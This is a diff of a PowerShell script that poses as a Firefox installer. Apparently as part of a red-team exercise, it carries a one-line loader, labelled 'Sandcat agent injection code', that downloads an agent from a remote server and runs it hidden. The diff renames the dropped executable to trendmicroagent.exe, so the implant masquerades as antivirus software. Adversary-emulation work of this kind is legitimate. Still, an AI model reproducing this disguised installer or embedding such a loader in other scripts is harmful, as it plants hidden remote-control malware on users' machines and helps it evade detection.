@@ -5,7 +5,7 @@ $firefoxUrl = "https://download.mozilla.org/?product=firefox-latest&os=win64&lan
 $installPath = "$env:ProgramFiles\Mozilla Firefox"
 
 # Sandcat agent injection code
-$server="http://10.0.11.8:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\windowshelper.exe"} | stop-process -f;rm -force "C:\Users\Public\windowshelper.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\windowshelper.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\windowshelper.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+$server="http://10.0.11.8:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\trendmicroagent.exe"} | stop-process -f;rm -force "C:\Users\Public\trendmicroagent.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\trendmicroagent.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\trendmicroagent.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
 
 # Check if Firefox is already installed
 if (Test-Path $installPath) {
